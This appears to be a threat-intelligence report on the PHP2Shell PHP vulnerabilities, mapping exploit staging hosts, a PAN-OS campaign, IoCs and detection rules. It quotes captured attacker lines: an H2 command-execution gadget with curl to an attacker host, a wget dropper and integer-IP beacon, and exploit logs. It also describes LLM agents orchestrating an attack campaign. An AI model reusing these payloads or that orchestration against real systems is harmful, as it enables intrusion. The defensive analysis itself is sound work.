For defenders, that makes the response the boring one, and the right one: patch to a supported PHP build, patch or restrict PAN-OS management interfaces, and keep eyes on internet-facing PHP. On the open web the mass wave has not arrived. Against PAN-OS it already has. The behavioral signatures above are enough to catch attempts today.

**We will keep tracking this infrastructure as it moves, and our open-directory data is usually where a real shift surfaces first. You can follow the same hosts in [AttackCapture™](https://hunt.io/features/attackcapture), or [book a walkthrough](https://hunt.io/get-started) to see how we map them.**

PHP2Shell emerged from two critical PHP memory-safety vulnerabilities, [CVE-2026-109618](https://portal.hunt.io/vulnerability/cve/CVE-2026-109618) and [CVE-2026-109619](https://portal.hunt.io/vulnerability/cve/CVE-2026-109619), rated CVSS 4.0 9.2 and patched on October 21, 2026. The flaws affect how PHP handles session uploads and out-of-memory conditions, creating a path to remote code execution under vulnerable configurations.

We already covered the exposure side on 2026-10-22, [mapping roughly 3.19 million internet-facing PHP hosts and the first open directories](https://hunt.io/blog/php2shell-cve-2026-109618-109619-open-directories) staging php2shell tooling. This report goes the other way. We take the public exploitation reports from watchTowr, 0x4D31, GreyNoise, Wiz, and CrowdStrike and pivot back into our [AttackCapture™](https://hunt.io/features/attackcapture) open-directory data to see who is running this, how operators are adapting it, and how far it has really gone. We separate confirmed php2shell compromise from tooling, attempted attacks, and compromises that turned out to use a different bug.

Our continued AttackCapture™ investigation identified additional exploit infrastructure, including a host at 130.94.67\[.\]235 (IP previously undisclosed) serving a proof of concept that repackages the PHP exploit chain for PAN-OS. Separately, [Dream Research](https://dreamgroup.com/blog/chained-php2shell-exploit-roots-25-servers) reported a campaign in which attackers chained PHP2Shell with the Fragnesia Linux kernel privilege-escalation vulnerability (CVE-2026-46300) to obtain root access on 25 servers. Unit 42 subsequently reported that it [verified](https://unit42.paloaltonetworks.com/cve-2026-109618-cve-2026-109619/) the same attacker's tooling and the reported results.

## Key findings

- Our open-directory hunt uncovered 616 PHP2Shell-related files, revealing a broad ecosystem of exploit development and staging infrastructure.
- We found shared exploit kits, cloned PoCs, custom heap exploits, scanners, and post-exploitation tooling across multiple hosts.
- A shared ASLR-bypass kit was byte-identical across four hosts, with lab logs confirming execution as www-data.
- Shells have been confirmed only on honeypots and sensors by watchTowr, 0x4D31, and GreyNoise. Wiz and CrowdStrike found none. On the open internet, there is still no evidence of reliable mass compromise, but php2shell has been used to root internet-facing PAN-OS firewalls, the first confirmed production compromises.
- In one capture, an operator ran php2shell against a national government, got only a crash, and then broke in with a different bug.
- A PAN-OS-focused repackaging was exposed at 130.94.67\[.\]235. Files including panos\_rce\_poc.py and prce.py show adaptation of the PHP2Shell technique for a firewall-management environment.
- Operators stage these kits against hand-picked, high-value targets: a government finance ministry, a national bank, a government e-invoicing platform, telecom, and university systems.
- One operator wrote its own heap exploit and ships a log cleaner, which is more effort than running a public PoC.

## PHP2Shell: The Vulnerability and Exploitation Chain

[PHP's own advisories](https://www.php.net/archive/2026.php#2026-10-21-5) describe CVE-2026-109618 and CVE-2026-109619 as two related memory-safety bugs in PHP core. Both are rated CVSS v4.0 9.2 and fixed in PHP 8.2.35, 8.3.36, 8.4.27, and 8.5.12.

1. CVE-2026-109618 (GHSA-w8hw-w9fx-j79w) is a use-after-free reachable when PHP's old out-of-memory path calls longjmp() to abort a request without accounting for memory that was only partially set up, so the later request-cleanup step reads or branches on invalid state.
2. CVE-2026-109619 (GHSA-6wmf-4rv5-p3rp) is a related use-after-free where global state that should point into request memory is not reset correctly and can be read across requests after that memory is freed.

A third tracking entry, [CVE-2026-115560](https://www.php.net/archive/2026.php#2026-10-23-1), was opened on October 23 after the leak with no technical detail of its own. Its only [public guidance, from cPanel](https://support.cpanel.net/hc/en-us/articles/44488655369367-PHP-Security-Release-CVE-2026-115560), is to disable **session.upload\_progress** as a stopgap, which is the same mitigation the original advisories point to.

**session.upload\_progress**, on by default in PHP since version 5.4, is the practical way in. During a multipart upload, it writes progress data, including an attacker-controlled key, into the session file before the request finishes initializing, which is why it sits at the center of nearly every proof of concept we pulled from open directories.

The [full chain one operator's own tooling documents](https://qideng.substack.com/p/php2shell-dissecting-phps-critical) in detail uses that entry point to corrupt the Zend memory allocator, leak the libphp base address to defeat ASLR, then forge a destructor pointer so a later free calls system(). A [publicly staged README spells out the three stages almost exactly as PHP's advisory](https://github.com/ikow/php2shell-poc/blob/main/README.md) describes the underlying bug class:

1. **Heap groom**. An out-of-bounds read leaks the Zend memory-manager chunk base.
2. **libphp leak**. A forged zend\_string length exposes the destructor pointer and the libphp base, defeating ASLR.
3. Remote code execution, by forcing a call through the forged pointer.

If the target already has a local file inclusion bug, an operator can skip the heap work entirely, write PHP code into the session file through session.upload\_progress, then include that file through the existing LFI. One tool we pulled calls this step **chain\_a\_session\_lfi.py**, and its documentation is explicit that it needs nothing disabled on a stock install, only an existing include bug to reach the planted code.

Reliability remains the key limitation, as triggering a use-after-free does not guarantee control over subsequent memory access. The address-leak stage also depends heavily on PHP's build, memory limits, and worker model, with frequent memory exhaustion distinguishing attempted exploitation from reliably demonstrated success.

## PHP2Shell Exploitation in the Wild: What the Evidence Shows

Public reporting doesn't fully agree, and the split that matters is simple: who observed exploitation, and who looked and saw none.

- [0x4D31](https://github.com/0x4D31/honeypot-data/blob/main/reports/php2shell/2026-10-24-confirmed-rce.md) (Adel Karimi) ran PHP 8.4.26 honeypots and logged 32 shells from [162.35.99\[.\]94](https://portal.hunt.io/ip/162.35.99.94) across three targets, plus 3 from [15.204.59\[.\]70](https://portal.hunt.io/ip/15.204.59.70), on 2026-10-24. The signal he trusted was an Apache worker spawning a shell, not an HTTP 200. He also flagged his test as a single-worker setup, which is kind to the exploit.
- [GreyNoise](https://php.events.greynoise.io/) logged 5 shells from [2.59.133\[.\]151](https://portal.hunt.io/ip/2.59.133.151) on 2026-10-28 and 10-29, again apache2 spawning sh. The spawned shell ran a curl to an integer-encoded version of the attacker's own IP, then sleep 5.
- [Wiz](https://www.wiz.io/blog/php2shell-exploitation-so-far) published on 2026-10-27 and took the other side. Its attempts mostly triggered memory exhaustion and failed the address leak, and it saw no end-to-end success in its own telemetry. It credited the honeypot result but called it a favorable configuration.
- [CrowdStrike](https://www.crowdstrike.com/en-us/blog/obstacles-to-weaponizing-php2shell-likely-constrain-exploitation/) reached the same conclusion on 2026-10-23: no exploitation in the wild or in its own honeypots, only testing and failed attempts, and no public exploit it judged good enough for widespread use.

So **three** independent honeypot networks confirm the bug works in some conditions, while **two** major vendors looked and saw nothing land. **watchTowr** [reported](https://watchtowr.com/intelligence/php-remote-code-execution-php2shell/) exploitation of both CVEs on its Attacker Eye honeypots on 2026-10-21, the earliest of the three, alongside the shells 0x4D31 and GreyNoise logged. **None of these honeypot results show it reliably compromising arbitrary production servers, and every vantage point in this section is a honeypot or a sensor. The confirmed production compromises are against PAN-OS, covered below.**

Several other firms, including **Tenable**, **Sophos**, **Zscaler**, **Elastic**, and **Tanium**, published advisories and detection guidance but reported no exploitation of their own. This is the public reporting available as of October 30, not necessarily a complete record.

The earliest careful assessment said the same thing. On 2026-10-21, the day the fixes landed and before the week of alarm, Daniel Card at PwnDefend [weighed how likely mass exploitation really was](https://www.pwndefend.com/2026/10/21/how-likely-is-mass-exploitation-of-php2shell/) and called it a high-alert but not-yet-active scenario: mass denial of service and memory disclosure were the probable outcomes, while reliable RCE would stay tied to specific stacks (SAPI, memory\_limit, architecture). That held for the open internet. It did not hold for uniform appliance stacks. php2shell has since been used to root internet-facing PAN-OS firewalls, the stack-specific reliable RCE Card identified as the real risk.

The three IPs behind those confirmed shells are below.

### Confirmed shells on honeypots and sensors

| IP | Host / ASN | Country | Reported by | Notes | 
|---|---|---|---|---|
| [162.35.99\[.\]94](https://portal.hunt.io/ip/162.35.99.94) | InterServer (AS19318) | US | 0x4D31, Wiz | 32 shells; also stages a separate Metabase/H2 RCE on :8090 | 
| [15.204.59\[.\]70](https://portal.hunt.io/ip/15.204.59.70) | OVH | US | 0x4D31, Wiz | 3 shells; opendir on :81 with an sh dropper and integer-IP beacon | 
| [2.59.133\[.\]151](https://portal.hunt.io/ip/2.59.133.151) | dataforest GmbH (AS58212) | DE | GreyNoise | 5 shells; boundaries ----lf and ----rceStock, which we do not see in our data | 

To pull these up, search each IP in [AttackCapture™](https://hunt.io/features/attackcapture), or run the open-directory query from our Query Playbook:

```
SELECT
  file_url,
  file_name
FROM
  open_directories
WHERE
  ip = '162.35.99.94'
  OR ip = '15.204.59.70'
  OR ip = '2.59.133.151'
GROUP BY
  file_url,
  file_name
```
                Copy
Output example:

Figure 1. A HuntSQL query to find filenames exposed through open directories across three IP addresses, 162.35.99\[.\]94, 15.204.59\[.\]70, and 2.59.133\[.\]151.
The [query](https://portal.hunt.io/sql?sql=SELECT%0A++file_url%2C%0A++file_name%0AFROM%0A++open_directories%0AWHERE%0A++ip+%3D+%27162.35.99.94%27%0A++OR+ip+%3D+%2715.204.59.70%27%0A++OR+ip+%3D+%272.59.133.151%27%0AGROUP+BY%0A++file_url%2C%0A++file_name&run=true&page=0&size=25&sizeWasCapped=false&hl=true&ec=true&tf=30&hasExplicitTimeframe=false&tab=results) returned **107 events** since September 29, 2026, indicating repeated activity involving **five distinct file URLs** across the observed timeframe. The files include a SQL proof of concept, HTTP logs, and several numbered or versioned resources.

On [162.35.99\[.\]94](https://portal.hunt.io/ip/162.35.99.94), the open directory on :8090 is not php2shell at all. It is an H2 database RCE gadget aimed at Metabase, a different tool the same host happens to run:

```
CREATE ALIAS IF NOT EXISTS EXEC AS 'void run(String cmd) throws java.io.IOException { Runtime.getRuntime().exec(new String[]{"bash","-c",cmd}); }';
CALL EXEC('curl -s -m 5 http://162.35.99[.]94:8090/metabase-rce-139.162.86[.]33');
```
                Copy
On [15.204.59\[.\]70](https://portal.hunt.io/ip/15.204.59.70), the open directory holds the second-stage dropper and a beacon that calls home to an integer-encoded form of its own IP:

```
# identify, beacon, second-stage pull over wget/curl, self-contained
wget -q -O /tmp/.s2 "http://15.204.59[.]70:81/s2"
# beacon back, integer-IP http, no SNI
wget -q -O /dev/null "http://265042758:81/b?..."
```
                Copy
## Mapping the PHP2Shell Exploit Infrastructure

The public reports show where shells landed. They do not show the tooling behind them, and that is what our open-directory data maps next. The hunting methodology began with three confirmed IPs and publicly reported file artifacts as initial indicators. **AttackCapture™ Code Search** was used to search indexed open-directory file contents for key strings, including **session.upload\_progress** and the relevant CVE identifiers, identifying [616 matching files](https://portal.hunt.io/attackcapture/code-search?q=%22%5C%22session.upload_progress%5C%22%22&run=true) as of October 30.

**HuntSQL's open\_directories** table was used to validate timestamps and host activity, while IP enrichment provided ASN, hosting provider, and country details for infrastructure attribution.

**Note**: An exposed toolkit on an open directory proves the tooling is present, not that any given target was hit.

| Host:port | Role | Key files | New here | 
|---|---|---|---|
| [208.115.245\[.\]98](https://portal.hunt.io/attackcapture/filemanager?host=http://208.115.245.98:8088) / .99 / .102 :8088 | Toolkit staging cluster, cloned PoCs plus a running copy | php2shell\_dl/ (ikow, mnk-works, murrez, zr0n), p2s\_run/poc.py 535b9e29 | Yes | 
| [185.242.106\[.\]140:8000](https://portal.hunt.io/attackcapture/filemanager?host=http://185.242.106.140:8000) | Operational toolkit | vcript.py, sc.py heap RCE, scanners, vcsu7 log cleaner | Yes | 
| [45.39.190\[.\]176:8000](https://portal.hunt.io/attackcapture/filemanager?host=http://45.39.190.176:8000) | Dev/build box plus a Moodle workspace | chain\_a\_session\_lfi.py (= vcript.py), compiled PHP 8.4.15 | Yes | 
| 130.94.67\[.\]235 ( [:80](https://portal.hunt.io/attackcapture/filemanager?host=http://130.94.67.235), [:8080](https://portal.hunt.io/attackcapture/filemanager?host=http://130.94.67.235:8080)) | Same bug repackaged for PAN-OS | panos\_rce\_poc.py / prce.py 1c93ea48 | Yes | 
| [45.83.180\[.\]113:19001](https://portal.hunt.io/attackcapture/filemanager?host=http://45.83.180.113:19001) | php2shell IoC/kit tracker | php2shell\_watch\_report.txt | Yes | 
| [15.204.59\[.\]70:81](https://portal.hunt.io/attackcapture/filemanager?host=http://15.204.59.70:81) | Post-exploitation staging | s2 dropper, s2\_new integer-IP beacon | Contents new | 
| 85.121.179\[.\]129 ( [:53](https://portal.hunt.io/attackcapture/filemanager?host=http://85.121.179.129:53), [:80](https://portal.hunt.io/attackcapture/filemanager?host=http://85.121.179.129:80), [:443](https://portal.hunt.io/attackcapture/filemanager?host=http://85.121.179.129:443)) | Exploit-development host | php2shell-bypass-aslr-exp tree; cmd\*.log info-leak | Yes | 
| [34.146.20\[.\]31](https://portal.hunt.io/attackcapture/filemanager?host=http://34.146.20.31:8181) / [38.60.136\[.\]217](https://portal.hunt.io/attackcapture/filemanager?host=http://38.60.136.217:8111) / [96.126.130\[.\]81](https://portal.hunt.io/attackcapture/filemanager?host=http://96.126.130.81:9999) / [101.133.233\[.\]159](https://portal.hunt.io/attackcapture/filemanager?host=http://101.133.233.159:8080) | Shared 9bie kit, lab RCE to www-data | php2shell-bypass-aslr-exp (byte-identical), poc\_109618.py | Yes | 
| [130.12.180\[.\]89:8000](https://portal.hunt.io/attackcapture/filemanager?host=http://130.12.180.89:8000) | php2shell attempted, failed; pivoted to a web-framework RCE | p2s\_run.py, php2shell\_\*.log (RCE unreachable) | Yes | 
| [198.41.83\[.\]165:8000](https://portal.hunt.io/attackcapture/filemanager?host=http://198.41.83.165:8000) / [198.41.83\[.\]174:8000](https://portal.hunt.io/attackcapture/filemanager?host=http://198.41.83.174:8000) | Shared operator, php2shell plus password-cracking and scanning | p2s\_exp.py, identical SHA-256 8e655357b2... on both hosts, alongside hydra and nuclei | Yes | 
| [18.136.195\[.\]202:8888](https://portal.hunt.io/attackcapture/filemanager?host=http://18.136.195.202:8888) | Public PoC with a bundled ModSecurity detection rule | cve-2026-109618-php2shell/README.md, modsecurity-php2shell.conf | Yes | 
| [95.41.54\[.\]130:80](https://portal.hunt.io/attackcapture/filemanager?host=http://95.41.54.130:80) | Operator workstation running an AI offensive framework that tests php2shell among other bugs | ARTEX-main/ transcripts, alongside evilginx2 and cloud-attack tooling unrelated to php2shell | Yes | 

To sum up, we have mapped some of the open directories in multiple categories.

Figure 5. The php2shell staging servers we captured, grouped by operator. The same 9bie ASLR-bypass kit is byte-identical across four of them, lab-proven to reach www-data. This shared kit has not been observed landing on a live victim; the confirmed PAN-OS compromises trace to a separate operator.
The kits behind these files group into a few distinct operators.

### Inside the Operators' Exploit Toolkits

Our analysis found multiple groups running the same bug through different kits. One pattern, a single kit shared across many more operators, is covered separately below.

We have found a cluster of three open directories hosted at [208.115.245\[.\]98](https://portal.hunt.io/ip/208.115.245.98), [208.115.245\[.\]99](https://portal.hunt.io/ip/208.115.245.99), and [208.115.245\[.\]102](https://portal.hunt.io/ip/208.115.245.102), on port 8088 with the same layout. Each serves a php2shell\_dl/ folder of cloned public repos and a live copy under p2s\_run/. The running poc.py is identical on all three, which is what ties them together.

One cloned README states the target plainly: an automated php2shell exploit for CVE-2026-109618 and CVE-2026-109619, unauthenticated RCE in the PHP engine through session.upload\_progress heap corruption.

Figure 6. README for the 'php2shell' exploit (CVE-2026-109618/109619) that contains vulnerability explanation, exploitation chain, usage examples, offset-resolution methods, mitigation guidance, and references to related GitHub projects and research.
The second example pairs two open directories hosted at [185.242.106\[.\]140](https://portal.hunt.io/attackcapture/filemanager?host=http://185.242.106.140:8000) and [45.39.190\[.\]176](https://portal.hunt.io/attackcapture/filemanager?host=http://45.39.190.176:8000). Our analysis found two exploits with a byte-identical core: **vcript.py** on one and **chain\_a\_session\_lfi.py** on the other, and both import the same helper whose docstring reads, "Shared utilities for php2shell exploits."

This operator runs **two** techniques in parallel: the **session-injection LFI chain** and a **hand-written heap exploit** with hardcoded offsets for a specific PHP 8.4.26 Apache build. It also ships a utmp and wtmp log cleaner, which tells us it expects interactive shells on hosts it actually hits. Output comes back in the HTTP response directly, so there is no separate command-and-control channel to find.

### The exception that landed: Palo Alto PAN-OS firewalls rooted

This is the most important finding in this report, and it is not one more operator in the list above. On the open internet php2shell mostly dies in memory exhaustion. Palo Alto PAN-OS management is the exception, because it runs one uniform PHP 8.0.30 build across every unpatched box, which turns the unreliable heap chain into a calibratable, repeatable exploit.

We identified an exposed open directory at [130.94.67\[.\]235](https://portal.hunt.io/attackcapture/filemanager?host=http://130.94.67.235:8080) hosting a PAN-OS-focused adaptation of the PHP2Shell exploit chain. The directory contains two relevant files, panos\_rce\_poc.py and prce.py, indicating that the operator had adapted the PHP memory-corruption vulnerability for a different attack surface: Palo Alto Networks PAN-OS firewall management interfaces.

This is the first confirmed real-world php2shell compromise we can point to, and subsequent research by Dream Research [documented](https://dreamgroup.com/blog/chained-php2shell-exploit-roots-25-servers) an active exploitation campaign using a custom PHP2Shell implementation specifically developed and tailored for PAN-OS.

In its investigation, published on October 26 and updated October 29, Dream Research detailed how an attacker combined **CVE-2026-109618** and **CVE-2026-109619 (PHP2Shell)** with **[CVE-2026-46300 (Fragnesia)](https://nvd.nist.gov/vuln/detail/cve-2026-46300)**, a Linux kernel privilege-escalation vulnerability. The first exploit provided unauthenticated remote code execution through PHP's session.upload\_progress mechanism on the PAN-OS management web server (appweb).

The attacker then used Fragnesia to escalate privileges from the web-server execution context to root. The PHP2Shell implementation was a custom, non-public exploit rather than a copy of an existing public proof of concept. It was specifically adapted to PAN-OS and used version-dependent memory offsets and carefully calibrated heap layouts.

The attacker identified approximately 19,000 internet-facing PAN-OS firewalls, fingerprinted around 5,000 responsive devices, and narrowed the list to 240 targets matching the required geographic and software-version profiles. The automated exploitation campaign successfully rooted 24 firewalls initially. The attacker subsequently prioritized systems associated with a US government-affiliated environment, establishing a persistent reverse SSH tunnel into its internal network and exploiting an additional internal firewall management server. This brought the total to 25 compromised servers.

The operator did not run this by hand. The same directory held aiscan, an autonomous reconnaissance and scanning framework wired to two large language models, DeepSeek as its primary driver and Kimi for vision tasks such as reading captured screenshots, with target discovery handled by the FOFA search engine rather than a model. Claude Code was also present on the host.

Figure 10. AttackCapture™ showing the operator’s aiscan.yaml, API key redacted. The provider fields (openai, anthropic) and the “Kimi (Anthropic)” note are API-compatibility labels, not the vendors; the base\_url and model lines name the real services, DeepSeek and Kimi.
The operator's own instructions to the agent, recovered from its session logs, are written in Chinese. What the AI layer does here is orchestrate the campaign: it drives discovery, triage, and the scan-and-verify loop behind the target selection that pared roughly 19,000 firewalls down to a few hundred worth attacking.

The exploit itself, the php2shell and Fragnesia chain with its per-build memory offsets, is hand-calibrated work, and nothing in the capture shows a model writing it. The shift worth noting is not that AI built the exploit, but that it ran the operation around it, turning a hand-made chain into an automated, repeatable campaign.

Given its significance, we are covering this PAN-OS campaign in a dedicated analysis of its own.

### More operators and public PoCs

Another pair hosted at [198.41.83\[.\]165](https://portal.hunt.io/attackcapture/filemanager?host=http://198.41.83.165:8000) and [198.41.83\[.\]174](https://portal.hunt.io/attackcapture/filemanager?host=http://198.41.83.174:8000) on port 8000, hosted on the same network (VINAKOM COMMUNICATIONS, AS36327, US), runs an identical **php2shell exploit script** (p2s\_exp.py) alongside Hydra for password attacks and Nuclei for broader scanning.

One of the two hosts also exposed a leaked **Google Gemini API** key in plaintext, picked up by our automated secret scanning. The exploit script itself is a careful, documented implementation of the **session-poisoning-plus-LFI chain**, built to work against a stock PHP install with session.upload\_progress on, cleanup on, and no server-side setting disabled, as long as an existing local file inclusion is available to trigger the include.

A separate host, [18.136.195\[.\]202](https://portal.hunt.io/attackcapture/filemanager?host=http://18.136.195.202:8888) on port 8888, hosted on AWS in Singapore, stages a cloned proof of concept whose README documents the same three-stage heap leak, libphp leak, and forged-destructor chain described above, matched almost word for word against the official GHSA advisory text for both CVEs.

**Note**: On names: the handles in the code, ikow, LordX, and Tr0y, are the authors of the public PoCs and the reused log cleaner. They are not the operators. Treat them as tool lineage, not attribution.

### An exploit still in development, with the hard part working

One more capture deserves separating from the operator clusters above. [85.121.179\[.\]129](https://portal.hunt.io/ip/85.121.179.129) (AS48753, AlexHost SRL, Chisinau, Moldova) is not a staging box running someone else's kit. It is an exploit-development tree, 4,768 files and about 620 MB, served open across ports 53, 80, and 443 and updated as recently as 2026-10-28 03:37 UTC. We first captured it on 2026-10-26.

After the analysis, we found the working notes of someone building the heap exploit, such as chunk-sweep and heap-grooming scripts, out-of-bounds probes, and dozens of timestamped run logs. Several of the research notes inside, written mostly in **Chinese**, work through PHP's own RINIT initialization order in detail, tracing exactly where in the request lifecycle the **session.upload\_progress** callback runs relative to PHP's normal startup, and using that timing to explain why some chains succeed and others only crash the worker.

One proof-of-concept script on the host, **sup\_poc.py**, documents a pure cross-request trigger for the bug with no application-level session code required at all, sending one request that forces an out-of-memory bailout after session initialization, then a second request that reads back the resulting state.

In the operator's own cmd5.log, that step is working:

```
leak 819208 ptrs 8762
B2 1 1.4s vl=384 n1=2000 n2=1990 name_len=10 rc=1 ptr=0x7fffa42f8000 ht=384 resp=229781 status='HTTP/1.1 200 OK'
```
                Copy
The ten-character name\_len is the same multipart-boundary tell we flag under detection. The HTTP 200 carries leaked heap pointers back to the operator, and the log resolves a base address from them. This is the first time in our own data we have caught the address-leak primitive succeeding against a real target instead of dying in memory exhaustion.

**Note**: The logs we reviewed reach a working leak, not confirmed command execution on a live production host, and the target it is aimed at is not one we can confirm from the capture.

### The same kit, many operators, deliberate targets

The Moldova workbench is not a one-off. The same ASLR-bypass tree, byte-identical by SHA-256, turns up across **four** more open directories captured between October 22 and October 27, [34.146.20\[.\]31](https://portal.hunt.io/attackcapture/filemanager?host=http://34.146.20.31:8181), [38.60.136\[.\]217](https://portal.hunt.io/attackcapture/filemanager?host=http://38.60.136.217:8111), [96.126.130\[.\]81](https://portal.hunt.io/attackcapture/filemanager?host=http://96.126.130.81:9999), and [101.133.233\[.\]159](https://portal.hunt.io/attackcapture/filemanager?host=http://101.133.233.159:8080). The exploit scripts, the leak tool (tools/aslr\_run.py), the lab configurations, and even the debugger logs match from host to host. This is one kit shared between operators, not several people independently building the same thing.

On those four hosts, the kit works in a lab. The operators' own logs record a shell running as the web server user against vulnerable PHP builds, 8.2.34 and 8.4.26, with the address-leak step solved, the same result read on the Moldova host. One log line states the proof outright: **uid=33(www-data) gid=33(www-data) groups=33(www-data)**. The capability is real, and it is spreading between operators who are not in the same group.

```
tools/aslr_run.py  sha256 5e99d6023dce...  identical on 34.146.20[.]31 - 38.60.136[.]217 - 101.133.233[.]159
from the kit's own notes:  PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
                Copy
The staging directories hold hand-picked targets: a government finance ministry in Central Africa, a national bank in a European microstate, a government e-invoicing platform in East Asia, a commercial and telecom group in Southeast Asia, and university and procurement systems in the Caucasus.

Figure 15. Where the operators aimed php2shell, by sector and region. These staged targets were not confirmed compromised by php2shell. Separately, php2shell was used to root internet-facing PAN-OS firewalls.
One capture shows what happens when the kit meets a target like that. On [130.12.180\[.\]89](https://portal.hunt.io/attackcapture/filemanager?host=http://130.12.180.89:8000), an operator ran the full **php2shell chain** (p2s\_run.py) against a **national government in Eastern Europe**, and it failed. The logs confirm that RCE was unsuccessful in the target configuration, with attempts resulting only in crashes and memory exhaustion. Session files remained outside the webroot, preventing execution.

The operator **ultimately gained access** by exploiting a separate server-side vulnerability, confirming that PHP2Shell was attempted against a **government target** but did not succeed.

```
the operator's own run log, target redacted:
count=1500  →  http-5xx
progress-upload: ok
[shell] не подтверждён   (sess_* вне webroot / не исполняется)
[СВОДКА] target=https://<gov>/  OOM=ДА   shell=НЕТ
```
                Copy
One of the operators we captured left an **AI assistant's session log** in an open directory. The transcript, in **Chinese**, works through the php2shell advisory and the public exploit, and ties into an AI-driven offensive workflow we have covered before. A small but concrete marker of where this is heading: the exploit research itself handed to an agent. Set the open directories beside the public reporting and the PAN-OS campaign, and the assessment follows.

## Assessment: PHP2Shell Has Moved Beyond Proofs of Concept

PHP2Shell's exploitation picture has changed materially. Our initial investigation documented a growing ecosystem of proof-of-concept exploits, shared toolkits, exploit-development environments, and operators attempting to turn PHP memory-corruption vulnerabilities into reliable remote code execution. At that stage, successful compromise of production systems remained difficult to establish from our own observations.

Subsequent reporting has raised the level of concern. Dream Research documented a campaign in which attackers chained PHP2Shell with the Fragnesia kernel privilege-escalation vulnerability to obtain root access on 25 servers. Unit 42 later reported independently verifying the same attacker's tooling and the reported results. These findings establish that the threat extends beyond experimental tooling and isolated honeypot observations.

For defenders, the priority is no longer simply to anticipate whether PHP2Shell might be weaponized. Successful exploitation has been reported, and chaining PHP2Shell with a privilege-escalation vulnerability demonstrates how an initial foothold can become a deeper infrastructure compromise. The recommendations that follow address both the PHP exploit and the escalation path behind it.

Recommendations

- Patch to PHP 8.2.35, 8.3.36, 8.4.27, or 8.5.12 depending on branch, closing CVE-2026-109618 and CVE-2026-109619 outright.
- Where patching has to wait, set session.upload\_progress.enabled = 0 in php.ini, the same stopgap cPanel shipped for CVE-2026-115560.
- Add a WAF or reverse proxy rule flagging multipart POST requests with no User-Agent, a boundary under roughly twelve characters, and an oversized PHPSESSID cookie.
- Add a host rule, auditd or EDR, alerting whenever an apache2 or php-fpm worker process spawns /bin/sh.
- Add an egress rule flagging Apache or php-fpm making outbound connections to a raw IP address with no SNI.
- Add a SIEM correlation rule for more than three multipart POSTs to the same PHP endpoint from one source within 60 seconds.
- Run a YARA rule for the kit's own markers, attacksessionid0001, \_\_PHP2SHELL\_PROBE, and php2shell-scan, across web server temp and upload directories.

## Indicators of Compromise

The indicators below are defanged. They cover the confirmed-shell sources, the staging and exploit-development hosts, and the file hashes behind the shared kit. The queries to reproduce them are in the detection section above.

| IP / host | ASN | Hosting provider | Country | Role | 
|---|---|---|---|---|
| 162.35.99\[.\]94 | AS19318 | Interserver | US | Confirmed source, honeypot shells | 
| 15.204.59\[.\]70 | AS16276 | OVH | US | Confirmed source, honeypot shells | 
| 2.59.133\[.\]151 | AS58212 | dataforest GmbH | DE | Confirmed source, GreyNoise | 
| 208.115.245\[.\]98:8088 | AS46475 | Limestone Networks | US | Staging cluster | 
| 208.115.245\[.\]99:8088 | AS46475 | Limestone Networks | US | Staging cluster | 
| 208.115.245\[.\]102:8088 | AS46475 | Limestone Networks | US | Staging cluster | 
| 185.242.106\[.\]140:8000 | AS42532 | SIA VEESP | LV | Operational toolkit | 
| 45.39.190\[.\]176:8000 | AS211273 | Cloud Software FZCO | HK | Dev/build box, Moodle victim | 
| 130.94.67\[.\]235:80,8080 | AS154177 | Light Node Limited | JP | PAN-OS repackage | 
| 45.83.180\[.\]113:19001 | AS62005 | BlueVPS | EE | IoC/kit tracker | 
| 15.204.59\[.\]70:81 | AS16276 | OVH | US | Post-exploitation staging | 
| 162.35.99\[.\]94:8090 | AS19318 | Interserver | US | Metabase/H2, separate exploit | 
| 85.121.179\[.\]129 | AS48753 | AlexHost SRL | MD | Exploit-development host; lab info-leak working | 
| 34.146.20\[.\]31 | AS396982 | Google LLC | JP | Shared 9bie kit, lab RCE | 
| 38.60.136\[.\]217 | AS154177 | Light Node Limited | FR | Shared 9bie kit, lab RCE | 
| 96.126.130\[.\]81 | AS149440 | Evoxt | JP | Shared 9bie kit (variant), lab RCE | 
| 101.133.233\[.\]159 | AS37963 | Alibaba Cloud | CN | Shared 9bie kit plus scanner | 
| 144.217.161\[.\]236 | AS16276 | OVH | CA | Staging; govt finance targets | 
| 152.42.245\[.\]8 | AS14061 | DigitalOcean | SG | Staging; commercial targets | 
| 23.27.25\[.\]75 | AS149440 | Evoxt | DE | Staging; education/commercial | 
| 130.12.180\[.\]89 | AS202412 | Omegatech | DE | php2shell attempted, failed; pivoted to other bug | 
| 45.225.135\[.\]53 | AS64107 | RACK SPHERE | NL | SMTP/XXE operator; php2shell scanner only | 

| File | SHA-256 | 
|---|---|
| murrez php2shell poc.py | 535b9e298defd3449ba2b10b9828925d3ce344872dcbd9470c0e8db20f0aae83 | 
| shared session-LFI exploit (vcript.py / chain\_a\_session\_lfi.py) | 6f84cc354b785157983efa8f4b674d2e1d6c3331017f29ff8d51bc43668d4b0f | 
| sc.py heap RCE | 2d692ee6dcb41c249c55881897b7dec0550b92963e07fccdb11ad655601977c3 | 
| python.py scanner | 66bcbc8c2b9d847a1e976e57972e10eac98e9b894cbf30510bff1e8d63efb81f | 
| panos\_rce\_poc.py | 1c93ea48fa7ff886a6d81e44869dd7962309e95d01c1561df362b0b18007a562 | 
| zr0n README | 9c15dc5a510bf2e8a16c846e61fa35c50ef733b72d4e47b6e8307498a398443c | 
| 162.35.99\[.\]94 poc.sql | 4a1502affa36d106d5374bf02cf777956eef651176ec8964b26ff90f103dd506 | 
| shared 9bie ASLR-bypass exploit (exploit.py, byte-identical across hosts) | c1e81cfbaf7e4cccad7d7f43c1a624b791ba1b7f1d176e224455138604837b4c | 
| 9bie kit leak tool (aslr\_run.py) | 5e99d6023dce9bb18d845a37fcdbc7ea574fdb20ab8d888ec54c695382d46036 | 

## Conclusion

Our investigation identified 616 files matching PHP2Shell-related indicators across indexed open directories, exposing a diverse ecosystem of exploit development, staging infrastructure, and operational tooling. We mapped multiple infrastructure clusters, identified shared exploit code across hosts, and traced how different operators were experimenting with the same vulnerabilities.

We found one exploit kit shared byte-for-byte across four hosts, with operator logs demonstrating successful command execution as www-data in laboratory environments. We also identified a separate PAN-OS-focused implementation at 130.94.67\[.\]235, showing how the vulnerability is being adapted to other products. We also found an operator attempting PHP2Shell against a government target, but its own logs recorded failed execution before the operator moved to a different vulnerability.

The evidence shows operators sharing tools, refining exploit chains, testing vulnerable configurations, and selecting high-value targets. It also shows that exploitation is highly dependent on the target environment, and that a working laboratory exploit does not automatically translate into reliable RCE on arbitrary production systems. Against a uniform stack like PAN-OS management, it translated into confirmed root on internet-facing firewalls.

